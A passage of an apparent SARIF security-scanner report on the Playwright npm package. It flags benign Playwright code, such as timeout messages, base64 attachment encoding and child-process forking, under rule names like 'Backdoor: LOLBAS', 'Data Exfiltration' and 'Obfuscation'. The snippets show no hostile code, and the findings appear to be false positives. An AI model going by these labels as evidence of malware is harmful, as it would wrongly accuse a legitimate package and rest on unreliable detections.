                      "text": "    const matcherDeadline = timeout ? startTime + timeout : _timeoutManager.kMaxDeadline;\n    const testDeadline = this._timeoutManager.currentSlotDeadline() - 250;\n    const matcherMessage = `Timeout ${timeout}ms exceeded while waiting on the predicate`;\n    const testMessage = `Test timeout of ${this.timeout}ms exceeded`;\n    return {\n      deadline: Math.min(testDeadline, matcherDeadline),\n      timeoutMessage: testDeadline < matcherDeadline ? testMessage : matcherMessage\n",
                      "markdown": "`    const matcherDeadline = timeout ? startTime + timeout : _timeoutManager.kMaxDeadline;\n    const testDeadline = this._timeoutManager.currentSlotDeadline() - 250;\n    const matcherMessage = `Timeout ${timeout}ms exceeded while waiting on the predicate`;\n    const testMessage = `Test timeout of ${this.timeout}ms exceeded`;\n    return {\n      deadline: Math.min(testDeadline, matcherDeadline),\n      timeoutMessage: testDeadline < matcherDeadline ? testMessage : matcherMessage\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testInfo.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 49,
                  "endLine": 46,
                  "endColumn": 58,
                  "snippet": {
                    "text": "  }\n  _deadlineForMatcher(timeout) {\n    const startTime = (0, _utils.monotonicTime)();\n    const matcherDeadline = timeout ? startTime + timeout : _timeoutManager.kMaxDeadline;\n    const testDeadline = this._timeoutManager.currentSlotDeadline() - 250;\n    const matcherMessage = `Timeout ${timeout}ms exceeded while waiting on the predicate`;\n    const testMessage = `Test timeout of ${this.timeout}ms exceeded`;\n",
                    "rendered": {
                      "text": "  }\n  _deadlineForMatcher(timeout) {\n    const startTime = (0, _utils.monotonicTime)();\n    const matcherDeadline = timeout ? startTime + timeout : _timeoutManager.kMaxDeadline;\n    const testDeadline = this._timeoutManager.currentSlotDeadline() - 250;\n    const matcherMessage = `Timeout ${timeout}ms exceeded while waiting on the predicate`;\n    const testMessage = `Test timeout of ${this.timeout}ms exceeded`;\n",
                      "markdown": "`  }\n  _deadlineForMatcher(timeout) {\n    const startTime = (0, _utils.monotonicTime)();\n    const matcherDeadline = timeout ? startTime + timeout : _timeoutManager.kMaxDeadline;\n    const testDeadline = this._timeoutManager.currentSlotDeadline() - 250;\n    const matcherMessage = `Timeout ${timeout}ms exceeded while waiting on the predicate`;\n    const testMessage = `Test timeout of ${this.timeout}ms exceeded`;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testInfo.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 27,
                  "endLine": 46,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  }\n  _deadlineForMatcher(timeout) {\n    const startTime = (0, _utils.monotonicTime)();\n    const matcherDeadline = timeout ? startTime + timeout : _timeoutManager.kMaxDeadline;\n    const testDeadline = this._timeoutManager.currentSlotDeadline() - 250;\n    const matcherMessage = `Timeout ${timeout}ms exceeded while waiting on the predicate`;\n    const testMessage = `Test timeout of ${this.timeout}ms exceeded`;\n",
                    "rendered": {
                      "text": "  }\n  _deadlineForMatcher(timeout) {\n    const startTime = (0, _utils.monotonicTime)();\n    const matcherDeadline = timeout ? startTime + timeout : _timeoutManager.kMaxDeadline;\n    const testDeadline = this._timeoutManager.currentSlotDeadline() - 250;\n    const matcherMessage = `Timeout ${timeout}ms exceeded while waiting on the predicate`;\n    const testMessage = `Test timeout of ${this.timeout}ms exceeded`;\n",
                      "markdown": "`  }\n  _deadlineForMatcher(timeout) {\n    const startTime = (0, _utils.monotonicTime)();\n    const matcherDeadline = timeout ? startTime + timeout : _timeoutManager.kMaxDeadline;\n    const testDeadline = this._timeoutManager.currentSlotDeadline() - 250;\n    const matcherMessage = `Timeout ${timeout}ms exceeded while waiting on the predicate`;\n    const testMessage = `Test timeout of ${this.timeout}ms exceeded`;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testInfo.js"
                },
                "region": {
                  "startLine": 359,
                  "startColumn": 127,
                  "endLine": 359,
                  "endColumn": 133,
                  "snippet": {
                    "text": "      name: attachment.name,\n      contentType: attachment.contentType,\n      path: attachment.path,\n      body: (_attachment$body = attachment.body) === null || _attachment$body === void 0 ? void 0 : _attachment$body.toString('base64')\n    });\n    step.complete({\n      attachments: [attachment]\n",
                    "rendered": {
                      "text": "      name: attachment.name,\n      contentType: attachment.contentType,\n      path: attachment.path,\n      body: (_attachment$body = attachment.body) === null || _attachment$body === void 0 ? void 0 : _attachment$body.toString('base64')\n    });\n    step.complete({\n      attachments: [attachment]\n",
                      "markdown": "`      name: attachment.name,\n      contentType: attachment.contentType,\n      path: attachment.path,\n      body: (_attachment$body = attachment.body) === null || _attachment$body === void 0 ? void 0 : _attachment$body.toString('base64')\n    });\n    step.complete({\n      attachments: [attachment]\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/portTransport.js"
                },
                "region": {
                  "startLine": 47,
                  "startColumn": 40,
                  "endLine": 47,
                  "endColumn": 45,
                  "snippet": {
                    "text": "        return;\n      }\n      if (ackId) {\n        const callback = this._callbacks.get(ackId);\n        this._callbacks.delete(ackId);\n        this._resetRef();\n        callback === null || callback === void 0 || callback(result);\n",
                    "rendered": {
                      "text": "        return;\n      }\n      if (ackId) {\n        const callback = this._callbacks.get(ackId);\n        this._callbacks.delete(ackId);\n        this._resetRef();\n        callback === null || callback === void 0 || callback(result);\n",
                      "markdown": "`        return;\n      }\n      if (ackId) {\n        const callback = this._callbacks.get(ackId);\n        this._callbacks.delete(ackId);\n        this._resetRef();\n        callback === null || callback === void 0 || callback(result);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/configLoader.js"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 46,
                  "endLine": 67,
                  "endColumn": 51,
                  "snippet": {
                    "text": "    for (const project of config.projects || []) projectOverrides.set(project.name, project);\n    const projects = [];\n    for (const project of result.projects || []) {\n      const projectOverride = projectOverrides.get(project.name);\n      if (projectOverride) {\n        projects.push({\n          ...project,\n",
                    "rendered": {
                      "text": "    for (const project of config.projects || []) projectOverrides.set(project.name, project);\n    const projects = [];\n    for (const project of result.projects || []) {\n      const projectOverride = projectOverrides.get(project.name);\n      if (projectOverride) {\n        projects.push({\n          ...project,\n",
                      "markdown": "`    for (const project of config.projects || []) projectOverrides.set(project.name, project);\n    const projects = [];\n    for (const project of result.projects || []) {\n      const projectOverride = projectOverrides.get(project.name);\n      if (projectOverride) {\n        projects.push({\n          ...project,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/configLoader.js"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 233,
                  "endLine": 23,
                  "endColumn": 238,
                  "snippet": {
                    "text": "etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]",
                    "rendered": {
                      "text": "etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]",
                      "markdown": "`etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/configLoader.js"
                },
                "region": {
                  "startLine": 292,
                  "startColumn": 11,
                  "endLine": 292,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    if (!force && !configIsModule) return false;\n    const innerProcess = require('child_process').fork(require.resolve('../../cli'), process.argv.slice(2), {\n      env: {\n        ...process.env,\n        PW_TS_ESM_LEGACY_LOADER_ON: '1'\n      },\n      execArgv: (0, _esmUtils.execArgvWithExperimentalLoaderOptions)()\n",
                    "rendered": {
                      "text": "    if (!force && !configIsModule) return false;\n    const innerProcess = require('child_process').fork(require.resolve('../../cli'), process.argv.slice(2), {\n      env: {\n        ...process.env,\n        PW_TS_ESM_LEGACY_LOADER_ON: '1'\n      },\n      execArgv: (0, _esmUtils.execArgvWithExperimentalLoaderOptions)()\n",
                      "markdown": "`    if (!force && !configIsModule) return false;\n    const innerProcess = require('child_process').fork(require.resolve('../../cli'), process.argv.slice(2), {\n      env: {\n        ...process.env,\n        PW_TS_ESM_LEGACY_LOADER_ON: '1'\n      },\n      execArgv: (0, _esmUtils.execArgvWithExperimentalLoaderOptions)()\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/configLoader.js"
                },
                "region": {
                  "startLine": 268,
                  "startColumn": 6,
                  "endLine": 268,
                  "endColumn": 17,
                  "snippet": {
                    "text": "}\nfunction restartWithExperimentalTsEsm(configFile, force = false) {\n  // Opt-out switch.\n  if (process.env.PW_DISABLE_TS_ESM) return false;\n\n  // There are two esm loader APIs:\n  // - Older API that needs a process restart. Available in Node 16, 17, and non-latest 18, 19 and 20.\n",
                    "rendered": {
                      "text": "}\nfunction restartWithExperimentalTsEsm(configFile, force = false) {\n  // Opt-out switch.\n  if (process.env.PW_DISABLE_TS_ESM) return false;\n\n  // There are two esm loader APIs:\n  // - Older API that needs a process restart. Available in Node 16, 17, and non-latest 18, 19 and 20.\n",
                      "markdown": "`}\nfunction restartWithExperimentalTsEsm(configFile, force = false) {\n  // Opt-out switch.\n  if (process.env.PW_DISABLE_TS_ESM) return false;\n\n  // There are two esm loader APIs:\n  // - Older API that needs a process restart. Available in Node 16, 17, and non-latest 18, 19 and 20.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/timeoutManager.js"
                },
                "region": {
                  "startLine": 131,
                  "startColumn": 46,
                  "endLine": 131,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    const error = new TimeoutManagerError(message);\n    error.name = '';\n    // Include location for hooks, modifiers and fixtures to distinguish between them.\n    error.stack = message + (location ? `\\n    at ${location.file}:${location.line}:${location.column}` : '');\n    return error;\n  }\n}\n",
                    "rendered": {
                      "text": "    const error = new TimeoutManagerError(message);\n    error.name = '';\n    // Include location for hooks, modifiers and fixtures to distinguish between them.\n    error.stack = message + (location ? `\\n    at ${location.file}:${location.line}:${location.column}` : '');\n    return error;\n  }\n}\n",
                      "markdown": "`    const error = new TimeoutManagerError(message);\n    error.name = '';\n    // Include location for hooks, modifiers and fixtures to distinguish between them.\n    error.stack = message + (location ? `\\n    at ${location.file}:${location.line}:${location.column}` : '');\n    return error;\n  }\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/timeoutManager.js"
                },
                "region": {
                  "startLine": 125,
                  "startColumn": 70,
                  "endLine": 125,
                  "endColumn": 79,
                  "snippet": {
                    "text": "        break;\n    }\n    const fixtureWithSlot = (_runnable$fixture2 = runnable.fixture) !== null && _runnable$fixture2 !== void 0 && _runnable$fixture2.slot ? runnable.fixture : undefined;\n    if (fixtureWithSlot) message = `Fixture \"${fixtureWithSlot.title}\" timeout of ${timeout}ms exceeded during ${fixtureWithSlot.phase}.`;\n    message = _utilsBundle.colors.red(message);\n    const location = (fixtureWithSlot || runnable).location;\n    const error = new TimeoutManagerError(message);\n",
                    "rendered": {
                      "text": "        break;\n    }\n    const fixtureWithSlot = (_runnable$fixture2 = runnable.fixture) !== null && _runnable$fixture2 !== void 0 && _runnable$fixture2.slot ? runnable.fixture : undefined;\n    if (fixtureWithSlot) message = `Fixture \"${fixtureWithSlot.title}\" timeout of ${timeout}ms exceeded during ${fixtureWithSlot.phase}.`;\n    message = _utilsBundle.colors.red(message);\n    const location = (fixtureWithSlot || runnable).location;\n    const error = new TimeoutManagerError(message);\n",
                      "markdown": "`        break;\n    }\n    const fixtureWithSlot = (_runnable$fixture2 = runnable.fixture) !== null && _runnable$fixture2 !== void 0 && _runnable$fixture2.slot ? runnable.fixture : undefined;\n    if (fixtureWithSlot) message = `Fixture \"${fixtureWithSlot.title}\" timeout of ${timeout}ms exceeded during ${fixtureWithSlot.phase}.`;\n    message = _utilsBundle.colors.red(message);\n    const location = (fixtureWithSlot || runnable).location;\n    const error = new TimeoutManagerError(message);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/timeoutManager.js"
                },
                "region": {
                  "startLine": 121,
                  "startColumn": 46,
                  "endLine": 121,
                  "endColumn": 55,
                  "snippet": {
                    "text": "      case 'slow':\n      case 'fixme':\n      case 'fail':\n        message = `\"${runnable.type}\" modifier timeout of ${timeout}ms exceeded.`;\n        break;\n    }\n    const fixtureWithSlot = (_runnable$fixture2 = runnable.fixture) !== null && _runnable$fixture2 !== void 0 && _runnable$fixture2.slot ? runnable.fixture : undefined;\n",
                    "rendered": {
                      "text": "      case 'slow':\n      case 'fixme':\n      case 'fail':\n        message = `\"${runnable.type}\" modifier timeout of ${timeout}ms exceeded.`;\n        break;\n    }\n    const fixtureWithSlot = (_runnable$fixture2 = runnable.fixture) !== null && _runnable$fixture2 !== void 0 && _runnable$fixture2.slot ? runnable.fixture : undefined;\n",
                      "markdown": "`      case 'slow':\n      case 'fixme':\n      case 'fail':\n        message = `\"${runnable.type}\" modifier timeout of ${timeout}ms exceeded.`;\n        break;\n    }\n    const fixtureWithSlot = (_runnable$fixture2 = runnable.fixture) !== null && _runnable$fixture2 !== void 0 && _runnable$fixture2.slot ? runnable.fixture : undefined;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/timeoutManager.js"
                },
                "region": {
                  "startLine": 114,
                  "startColumn": 229,
                  "endLine": 114,
                  "endColumn": 238,
                  "snippet": {
                    "text": "        break;\n      case 'teardown':\n        {\n          if (runnable.fixture) message = `Worker teardown timeout of ${timeout}ms exceeded while ${runnable.fixture.phase === 'setup' ? 'setting up' : 'tearing down'} \"${runnable.fixture.title}\".`;else message = `Worker teardown timeout of ${timeout}ms exceeded.`;\n          break;\n        }\n      case 'skip':\n",
                    "rendered": {
                      "text": "        break;\n      case 'teardown':\n        {\n          if (runnable.fixture) message = `Worker teardown timeout of ${timeout}ms exceeded while ${runnable.fixture.phase === 'setup' ? 'setting up' : 'tearing down'} \"${runnable.fixture.title}\".`;else message = `Worker teardown timeout of ${timeout}ms exceeded.`;\n          break;\n        }\n      case 'skip':\n",
                      "markdown": "`        break;\n      case 'teardown':\n        {\n          if (runnable.fixture) message = `Worker teardown timeout of ${timeout}ms exceeded while ${runnable.fixture.phase === 'setup' ? 'setting up' : 'tearing down'} \"${runnable.fixture.title}\".`;else message = `Worker teardown timeout of ${timeout}ms exceeded.`;\n          break;\n        }\n      case 'skip':\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/timeoutManager.js"
                },
                "region": {
                  "startLine": 114,
                  "startColumn": 58,
                  "endLine": 114,
                  "endColumn": 67,
                  "snippet": {
                    "text": "        break;\n      case 'teardown':\n        {\n          if (runnable.fixture) message = `Worker teardown timeout of ${timeout}ms exceeded while ${runnable.fixture.phase === 'setup' ? 'setting up' : 'tearing down'} \"${runnable.fixture.title}\".`;else message = `Worker teardown timeout of ${timeout}ms exceeded.`;\n          break;\n        }\n      case 'skip':\n",
                    "rendered": {
                      "text": "        break;\n      case 'teardown':\n        {\n          if (runnable.fixture) message = `Worker teardown timeout of ${timeout}ms exceeded while ${runnable.fixture.phase === 'setup' ? 'setting up' : 'tearing down'} \"${runnable.fixture.title}\".`;else message = `Worker teardown timeout of ${timeout}ms exceeded.`;\n          break;\n        }\n      case 'skip':\n",
                      "markdown": "`        break;\n      case 'teardown':\n        {\n          if (runnable.fixture) message = `Worker teardown timeout of ${timeout}ms exceeded while ${runnable.fixture.phase === 'setup' ? 'setting up' : 'tearing down'} \"${runnable.fixture.title}\".`;else message = `Worker teardown timeout of ${timeout}ms exceeded.`;\n          break;\n        }\n      case 'skip':\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/timeoutManager.js"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 42,
                  "endLine": 110,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        break;\n      case 'beforeAll':\n      case 'afterAll':\n        message = `\"${runnable.type}\" hook timeout of ${timeout}ms exceeded.`;\n        break;\n      case 'teardown':\n        {\n",
                    "rendered": {
                      "text": "        break;\n      case 'beforeAll':\n      case 'afterAll':\n        message = `\"${runnable.type}\" hook timeout of ${timeout}ms exceeded.`;\n        break;\n      case 'teardown':\n        {\n",
                      "markdown": "`        break;\n      case 'beforeAll':\n      case 'afterAll':\n        message = `\"${runnable.type}\" hook timeout of ${timeout}ms exceeded.`;\n        break;\n      case 'teardown':\n        {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/timeoutManager.js"
                },
                "region": {
                  "startLine": 106,
                  "startColumn": 23,
                  "endLine": 106,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        }\n      case 'afterEach':\n      case 'beforeEach':\n        message = `Test timeout of ${timeout}ms exceeded while running \"${runnable.type}\" hook.`;\n        break;\n      case 'beforeAll':\n      case 'afterAll':\n",
                    "rendered": {
                      "text": "        }\n      case 'afterEach':\n      case 'beforeEach':\n        message = `Test timeout of ${timeout}ms exceeded while running \"${runnable.type}\" hook.`;\n        break;\n      case 'beforeAll':\n      case 'afterAll':\n",
                      "markdown": "`        }\n      case 'afterEach':\n      case 'beforeEach':\n        message = `Test timeout of ${timeout}ms exceeded while running \"${runnable.type}\" hook.`;\n        break;\n      case 'beforeAll':\n      case 'afterAll':\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/timeoutManager.js"
                },
                "region": {
                  "startLine": 100,
                  "startColumn": 27,
                  "endLine": 100,
                  "endColumn": 36,
                  "snippet": {
                    "text": "          if (runnable.fixture) {\n            if (runnable.fixture.phase === 'setup') message = `Test timeout of ${timeout}ms exceeded while setting up \"${runnable.fixture.title}\".`;else message = `Tearing down \"${runnable.fixture.title}\" exceeded the test timeout of ${timeout}ms.`;\n          } else {\n            message = `Test timeout of ${timeout}ms exceeded.`;\n          }\n          break;\n        }\n",
                    "rendered": {
                      "text": "          if (runnable.fixture) {\n            if (runnable.fixture.phase === 'setup') message = `Test timeout of ${timeout}ms exceeded while setting up \"${runnable.fixture.title}\".`;else message = `Tearing down \"${runnable.fixture.title}\" exceeded the test timeout of ${timeout}ms.`;\n          } else {\n            message = `Test timeout of ${timeout}ms exceeded.`;\n          }\n          break;\n        }\n",
                      "markdown": "`          if (runnable.fixture) {\n            if (runnable.fixture.phase === 'setup') message = `Test timeout of ${timeout}ms exceeded while setting up \"${runnable.fixture.title}\".`;else message = `Tearing down \"${runnable.fixture.title}\" exceeded the test timeout of ${timeout}ms.`;\n          } else {\n            message = `Test timeout of ${timeout}ms exceeded.`;\n          }\n          break;\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/timeoutManager.js"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 222,
                  "endLine": 98,
                  "endColumn": 231,
                  "snippet": {
                    "text": "      case 'test':\n        {\n          if (runnable.fixture) {\n            if (runnable.fixture.phase === 'setup') message = `Test timeout of ${timeout}ms exceeded while setting up \"${runnable.fixture.title}\".`;else message = `Tearing down \"${runnable.fixture.title}\" exceeded the test timeout of ${timeout}ms.`;\n          } else {\n            message = `Test timeout of ${timeout}ms exceeded.`;\n          }\n",
                    "rendered": {
                      "text": "      case 'test':\n        {\n          if (runnable.fixture) {\n            if (runnable.fixture.phase === 'setup') message = `Test timeout of ${timeout}ms exceeded while setting up \"${runnable.fixture.title}\".`;else message = `Tearing down \"${runnable.fixture.title}\" exceeded the test timeout of ${timeout}ms.`;\n          } else {\n            message = `Test timeout of ${timeout}ms exceeded.`;\n          }\n",
                      "markdown": "`      case 'test':\n        {\n          if (runnable.fixture) {\n            if (runnable.fixture.phase === 'setup') message = `Test timeout of ${timeout}ms exceeded while setting up \"${runnable.fixture.title}\".`;else message = `Tearing down \"${runnable.fixture.title}\" exceeded the test timeout of ${timeout}ms.`;\n          } else {\n            message = `Test timeout of ${timeout}ms exceeded.`;\n          }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/timeoutManager.js"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 67,
                  "endLine": 98,
                  "endColumn": 76,
                  "snippet": {
                    "text": "      case 'test':\n        {\n          if (runnable.fixture) {\n            if (runnable.fixture.phase === 'setup') message = `Test timeout of ${timeout}ms exceeded while setting up \"${runnable.fixture.title}\".`;else message = `Tearing down \"${runnable.fixture.title}\" exceeded the test timeout of ${timeout}ms.`;\n          } else {\n            message = `Test timeout of ${timeout}ms exceeded.`;\n          }\n",
                    "rendered": {
                      "text": "      case 'test':\n        {\n          if (runnable.fixture) {\n            if (runnable.fixture.phase === 'setup') message = `Test timeout of ${timeout}ms exceeded while setting up \"${runnable.fixture.title}\".`;else message = `Tearing down \"${runnable.fixture.title}\" exceeded the test timeout of ${timeout}ms.`;\n          } else {\n            message = `Test timeout of ${timeout}ms exceeded.`;\n          }\n",
                      "markdown": "`      case 'test':\n        {\n          if (runnable.fixture) {\n            if (runnable.fixture.phase === 'setup') message = `Test timeout of ${timeout}ms exceeded while setting up \"${runnable.fixture.title}\".`;else message = `Tearing down \"${runnable.fixture.title}\" exceeded the test timeout of ${timeout}ms.`;\n          } else {\n            message = `Test timeout of ${timeout}ms exceeded.`;\n          }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/timeoutManager.js"
                },
                "region": {
                  "startLine": 92,
                  "startColumn": 9,
                  "endLine": 92,
                  "endColumn": 18,
                  "snippet": {
